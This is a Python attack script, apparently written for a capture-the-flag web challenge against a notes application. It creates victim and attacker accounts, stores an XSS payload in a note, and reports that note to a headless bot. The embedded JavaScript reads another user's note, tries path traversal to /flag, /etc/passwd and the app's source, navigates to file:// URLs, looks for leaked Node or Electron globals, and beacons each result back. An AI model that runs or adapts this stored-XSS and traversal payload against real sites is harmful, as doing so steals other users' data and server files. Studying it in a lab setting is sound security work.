#!/usr/bin/env python3
"""Round 2 of unintended probes — isolated, no global pollution."""
import sys, time, textwrap, requests
TARGET = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:8080'

s = requests.Session()
CREDS = {'username': 'probe2_x9q1', 'password': 'P!robe123'}
s.post(f'{TARGET}/register', data=CREDS); s.post(f'{TARGET}/login', data=CREDS)

other = requests.Session()
OTHER = {'username': 'victim2_n3z', 'password': 'V!ctim123'}
other.post(f'{TARGET}/register', data=OTHER); other.post(f'{TARGET}/login', data=OTHER)
r = other.post(f'{TARGET}/note/new',
               data={'title': 'secret', 'content': '<!--CANARY-FLAG-12345-->'},
               allow_redirects=False)
victim_id = r.headers['Location'].rsplit('/', 1)[-1]
print(f'victim note id: {victim_id}')

probe_js = textwrap.dedent(f"""\
    (() => {{
      const beacon = (k, v) => {{
        const u = '/notes?probe=' + k + '&v=' + encodeURIComponent(String(v).slice(0,300));
        try {{ new Image().src = u; }} catch(_) {{}}
      }};
      beacon('boot', 'ok');

      // Q1: read another user's note via same-origin
      fetch('/note/{victim_id}').then(r => r.text())
        .then(t => beacon('Q1', t.indexOf('CANARY-FLAG-12345') >= 0 ? 'CAN-READ' : 'no-canary'))
        .catch(e => beacon('Q1err', e.message));

      // Q2: try path-traversal variants in /out
      ['../flag','/flag','%2e%2e%2fflag','foo/../../flag'].forEach((p, i) =>
        fetch('/out/' + p).then(r => beacon('Q2_'+i, r.status))
          .catch(e => beacon('Q2err_'+i, e.message)));

      // Q3: try Flask static file traversal
      ['../app.py','../bot/preload.js','../../etc/passwd','../bot/main.js'].forEach((p, i) =>
        fetch('/static/' + p).then(r => r.status === 200 ? r.text() : null)
          .then(t => beacon('Q3_'+i, t ? t.slice(0, 80) : 'blocked'))
          .catch(e => beacon('Q3err_'+i, e.message)));

      // Q4: window.location to file:// — does it navigate?
      setTimeout(() => {{
        beacon('Q4_pre', location.href);
        try {{ location.href = 'file:///flag'; }} catch(e) {{ beacon('Q4ex', e.message); }}
      }}, 500);

      // Q5: enumerate all globals to look for leaked Node refs
      const interesting = [];
      for (const k of Object.getOwnPropertyNames(window)) {{
        if (/process|require|buffer|module|electron|ipc|node|__dir|__file|setImmediate|fs|child_process/i.test(k))
          interesting.push(k);
      }}
      beacon('Q5', interesting.join(',') || '(none)');

      // Q6: check globalThis === window? Anything else reachable?
      try {{
        beacon('Q6', 'gt=' + (globalThis === window) + ' top=' + (top === self)
                     + ' parent=' + (parent === self));
      }} catch(e) {{}}

      // Q7: is there a service worker / cache API leak path?
      beacon('Q7', 'sw=' + (typeof navigator.serviceWorker)
                  + ' cache=' + (typeof window.caches));

      // Q8: noteAPI.ping — what does it actually return / leak?
      try {{
        const p = window.noteAPI.ping();
        p.then(v => beacon('Q8', 'resolved:' + JSON.stringify(v).slice(0,80)))
         .catch(e => beacon('Q8rej', String(e).slice(0,150)));
      }} catch(e) {{ beacon('Q8ex', e.message); }}

      // Q9: try to navigate via meta refresh
      const m = document.createElement('meta');
      m.httpEquiv = 'refresh';
      m.content = '2; url=file:///flag';
      document.head.appendChild(m);

      // Q10: check renderer's window.opener / parent for cross-origin leak
      try {{
        beacon('Q10', 'opener=' + window.opener + ' parent_loc=' + (parent !== self ? parent.location.href : 'self'));
      }} catch(e) {{ beacon('Q10sop', e.message); }}
    }})();
""")
content = f'<script>\n{probe_js}\n</script>'
r = s.post(f'{TARGET}/note/new', data={'title':'p2','content':content},
           allow_redirects=False)
print(f'probe id: {r.headers["Location"].rsplit("/", 1)[-1]}')
s.post(f'{TARGET}/report', data={'id': r.headers['Location'].rsplit('/',1)[-1]})
time.sleep(15)
